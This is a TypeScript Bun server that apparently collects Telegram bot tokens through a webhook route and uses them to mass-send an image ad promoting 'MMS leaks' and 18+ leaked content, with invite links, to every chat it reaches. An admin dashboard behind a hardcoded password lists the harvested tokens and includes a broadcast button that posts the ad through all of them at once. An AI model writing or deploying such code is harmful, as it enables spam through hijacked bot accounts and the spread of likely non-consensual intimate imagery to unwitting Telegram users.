import { serve } from "bun";
import NodeCache from "node-cache";

interface TelegramUpdate {
  message?: any;
  edited_message?: any;
  channel_post?: any;
  edited_channel_post?: any;
  my_chat_member?: any;
  chat_member?: any;
  chat_join_request?: any;
}

const cache = new NodeCache();

cache.set("ads", {
  permanent: {
    imageSource: "https://i.ibb.co/J66PqCQ/x.jpg",
    captionText: `🔥 <b>NEW MMS LEAKS ARE OUT!</b> 🔥\n\n💥 <b><u>EXCLUSIVE PREMIUM CONTENT</u></b> 💥\n\n🎬 <i>Fresh leaked content daily</i>\n🔞 <b>18+ Adult Material</b>\n💎 <i>Premium quality videos & files</i>\n🚀 <b>Instant access available</b>\n\n⬇️ <b><u>Click any server below</u></b> ⬇️`,
    actionLinks: [
      { linkText: "🎥 VIDEOS💦", linkDestination: "https://t.me/+Go8FEdh9M8Y3ZWU1" },
      { linkText: "📁 FILES🍑", linkDestination: "https://t.me/+06bZb-fbn4kzNjll" }
    ]
  },
  temporary: null
});

function isValidTelegramBotToken(token: string): boolean {
  return /^\d{6,}:[A-Za-z0-9_-]{30,}$/.test(token);
}

function appendLog(line: string) {
  let log = cache.get("log_bar") as string || "";
  log += line + "\n";
  // Only keep up to 100kB (100*1024 bytes)
  if (log.length > 102400) {
    // Cut from the beginning to keep only last 100kB
    log = log.slice(-102400);
    // Optionally, trim partial line at start
    const firstNewline = log.indexOf("\n");
    log = log.slice(firstNewline + 1);
  }
  cache.set("log_bar", log);
}

serve({
  port: 3000,
  async fetch(req) {
    const url = new URL(req.url);
    const path = url.pathname;
    const method = req.method;
    const pass = url.searchParams.get("pass");

    if (method === "GET" && path === "/") {
      if (pass !== "admin123") {
        return new Response(`<form><input name='pass'><button>Login</button></form>`, {
          headers: { "Content-Type": "text/html" },
        });
      }

      const stats = {
        total: cache.get("total_messages") || 0,
        users: Array.from(new Set((cache.get("users") || []) as string[])),
        bots: Array.from(new Set((cache.get("bots") || []) as string[])),
        ads: cache.get("ads") || {},
        tokenResponses: (() => {
          const raw = cache.get("token_responses") as string | undefined;
          if (!raw) return {};
          const obj = JSON.parse(raw);
          let changed = false;
          for (let token in obj) {
            if (!isValidTelegramBotToken(token)) {
              delete obj[token];
              changed = true;
            }
          }
          if (changed) cache.set("token_responses", JSON.stringify(obj));
          return obj;
        })(),
        logBar: cache.get("log_bar") as string || ""
      };

      const sortedTokens = Object.entries(stats.tokenResponses)
        .sort((a, b) => (b[1] as number) - (a[1] as number))
        .slice(0, 100);

      const maxCount = Math.max(...sortedTokens.map(([_, count]) => count as number), 1);

      const tokenBar = sortedTokens.map(([token, count]) => {
        const widthPercent = (count as number / maxCount) * 100;
        return `
          <div style="margin:12px 0; padding: 6px; background:#1a1a1a; border-radius: 6px; display:flex; align-items:center; gap:12px;">
            <div style="flex:1;">
              <div style="font-family: monospace; word-break: break-all; color:#f97316; margin-bottom: 4px;">Token: ${token}</div>
              <div style="background:#333; width:100%; height:20px; border-radius:5px; overflow:hidden;">
                <div style="background:#f97316; width:${widthPercent}%; height:100%"></div>
              </div>
              <div style="color:#ccc; margin-top: 4px;">Responses: <b>${count}</b></div>
            </div>
            <form method="POST" action="/remove-token?token=${encodeURIComponent(token)}&pass=admin123" style="margin:0;">
              <button type="submit" style="background:red;">🗑 Remove</button>
            </form>
          </div>
        `;
      }).join("");

      const form = (type: string, ad: any) => `
        <h3>${type.toUpperCase()} AD</h3>
        <form method='POST' action='/update-ad?type=${type}&pass=admin123'>
          <input name='imageSource' placeholder='Image URL' value="${ad?.imageSource || ''}" style='width:100%'><br>
          <textarea name='captionText' placeholder='Caption' rows=6 style='width:100%'>${ad?.captionText || ''}</textarea><br>
          <textarea name='actionLinks' placeholder='[{\"linkText\":\"Text\", \"linkDestination\":\"URL\"}]' style='width:100%'>${JSON.stringify(ad?.actionLinks || [], null, 2)}</textarea><br>
          <button>Update ${type} Ad</button>
        </form>`;

      return new Response(`<!DOCTYPE html><html><head><meta charset="UTF-8"><style>
        body { background:black; color:white; font-family:sans-serif; padding:2em; }
        h1, h2, h3 { color: #f97316; }
        button { padding: 10px 20px; margin: 10px 0; background: #f97316; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; }
        button[style*="background:red"] { background: #e11d48 !important; }
        textarea, input { margin: 5px 0; padding: 10px; border-radius: 5px; border: none; }
        pre { background: #1e1e1e; padding: 1em; border-radius: 8px; max-height: 300px; overflow-y: auto; }
        .log-bar { background: #222; color: #fafafa; font-family: monospace; border-radius: 6px; margin-top: 2em; padding:1em; max-height:200px; overflow-y:auto; font-size: 0.92em;}
      </style></head><body>
        <h1>📊 Bot Dashboard</h1>
        <p><b>Total Messages:</b> ${stats.total}</p>
        <p><b>Users:</b> ${stats.users.length}</p>
        <p><b>Bots:</b> ${stats.bots.length}</p>

        <form method='POST' action='/clear-cache?pass=admin123'>
          <button type='submit'>🗑 Clear Cache</button>
        </form>

        <h2>🔥 Top 100 Tokens by Responses</h2>
        ${tokenBar}

        ${form("permanent", stats.ads.permanent)}
        ${form("temporary", stats.ads.temporary)}

        <h2>📜 Log Bar <span style="font-size:0.9em;font-weight:normal;color:#888;">(auto-trimmed at 100KB)</span></h2>
        <div class="log-bar">${stats.logBar.replace(/</g,"&lt;").replace(/\n/g,"<br>")}</div>
      </body></html>`, { headers: { "Content-Type": "text/html" } });
    }

    if (method === "POST" && path === "/remove-token" && pass === "admin123") {
      const token = url.searchParams.get("token");
      if (token && isValidTelegramBotToken(token)) {
        // Remove from token_responses
        const tokenResponsesRaw = cache.get("token_responses") as string | undefined;
        const tokenResponses = tokenResponsesRaw ? JSON.parse(tokenResponsesRaw) : {};
        delete tokenResponses[token];
        cache.set("token_responses", JSON.stringify(tokenResponses));
        // Remove from bots list
        const bots = cache.get("bots") || [];
        cache.set("bots", bots.filter((t: string)=>t!==token));
        appendLog(`[${new Date().toISOString()}] Removed bot token: ${token}`);
        return new Response(`<script>alert('Removed');location.href='/?pass=admin123'</script>`,{headers:{"Content-Type":"text/html"}});
      }
      return new Response(`<script>alert('Invalid token');location.href='/?pass=admin123'</script>`,{headers:{"Content-Type":"text/html"}});
    }

    if (method === "POST" && path === "/send-to-channels" && pass === "admin123") {
      const bots = Array.from(new Set((cache.get("bots") || []) as string[]));
      const chatLinks = cache.get("chat_links") || {};
      const ads = cache.get("ads") || {};
      const ad = ads.temporary || ads.permanent;

      for (const bot of bots) {
        for (const chatId of Object.keys(chatLinks)) {
          fetch(`https://api.telegram.org/bot${bot}/sendPhoto`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              photo: ad.imageSource,
              caption: ad.captionText,
              parse_mode: "HTML",
              reply_markup: {
                inline_keyboard: ad.actionLinks.map((l: any) => [{ text: l.linkText, url: l.linkDestination }])
              }
            })
          }).catch(() => {});
        }
      }
      appendLog(`[${new Date().toISOString()}] Sent ads to all channels`);
      return new Response(`<script>alert('✅ Sent to All');location.href='/?pass=admin123'</script>`, { headers: { "Content-Type": "text/html" } });
    }

    if (method === "POST" && path === "/update-ad" && pass === "admin123") {
      const formData = await req.formData();
      const type = url.searchParams.get("type")!;
      const imageSource = formData.get("imageSource")?.toString();
      const captionText = formData.get("captionText")?.toString();
      const actionLinksRaw = formData.get("actionLinks")?.toString();
      try {
        const ads = cache.get("ads") || {};
        ads[type] = {
          imageSource,
          captionText,
          actionLinks: JSON.parse(actionLinksRaw || "[]")
        };
        cache.set("ads", ads);
        appendLog(`[${new Date().toISOString()}] Updated "${type}" ad settings`);
        return new Response(`<script>alert('✅ ${type.toUpperCase()} ad updated');location.href='/?pass=admin123'</script>`, { headers: { "Content-Type": "text/html" } });
      } catch {
        return new Response(`<script>alert('❌ Invalid input');location.href='/?pass=admin123'</script>`, { headers: { "Content-Type": "text/html" } });
      }
    }

    if (method === "POST" && path.startsWith("/webhook/")) {
      const botToken = path.replace("/webhook/", "");

      // Ignore if this is not a valid Telegram bot token
      if (!isValidTelegramBotToken(botToken)) {
        return new Response("Ignored: Invalid token format");
      }

      const update: TelegramUpdate = await req.json();

      // Track bot tokens
      const bots = cache.get("bots") || [];
      cache.set("bots", Array.from(new Set([...bots as string[], botToken])));

      // Token responses, as JSON string
      const tokenResponsesRaw = cache.get("token_responses") as string | undefined;
      const tokenResponses = tokenResponsesRaw ? JSON.parse(tokenResponsesRaw) : {};
      tokenResponses[botToken] = (tokenResponses[botToken] || 0) + 1;
      cache.set("token_responses", JSON.stringify(tokenResponses));

      const total = (cache.get("total_messages") as number) || 0;
      cache.set("total_messages", total + 1);

      appendLog(`[${new Date().toISOString()}] Webhook: ${botToken} | Count: ${tokenResponses[botToken]}`);

      const activity = update.message || update.edited_message || update.channel_post || update.edited_channel_post || update.my_chat_member || update.chat_member || update.chat_join_request;
      if (!activity) return new Response("Ignored");

      const chatId = activity.chat?.id || activity.chat?.chat?.id || activity.from?.id;
      const userId = activity.from?.id?.toString();
      const users = cache.get("users") || [];
      const chatLinks = cache.get("chat_links") || {};
      if (userId) cache.set("users", Array.from(new Set([...users as string[], userId])));

      if (!chatLinks[chatId]) {
        fetch(`https://api.telegram.org/bot${botToken}/getChat`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId })
        })
        .then(res => res.json())
        .then(result => {
          if (result.ok) {
            const info = result.result;
            const link = info.username ? `https://t.me/${info.username}` : info.invite_link || `https://t.me/c/${String(chatId).replace("-100", "")}`;
            chatLinks[chatId] = link;
            cache.set("chat_links", chatLinks);
          }
        }).catch(() => {});
      }

      const ads = cache.get("ads") || {};
      const ad = ads.temporary || ads.permanent;
      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          photo: ad.imageSource,
          caption: ad.captionText,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: ad.actionLinks.map((l: any) => [{ text: l.linkText, url: l.linkDestination }])
          }
        })
      }).catch(() => {});

      return new Response("OK");
    }

    if (method === "POST" && path === "/clear-cache" && pass === "admin123") {
      cache.flushAll();
      appendLog(`[${new Date().toISOString()}] Cleared cache`);
      return new Response(`<script>alert('🗑 Cache Cleared');location.href='/?pass=admin123'</script>`, {
        headers: { "Content-Type": "text/html" },
      });
    }

    return new Response("Not Found", { status: 404 });
  }
});

console.log("✅ Ultra-fast full-activity bot dashboard is live on http://localhost:3000");
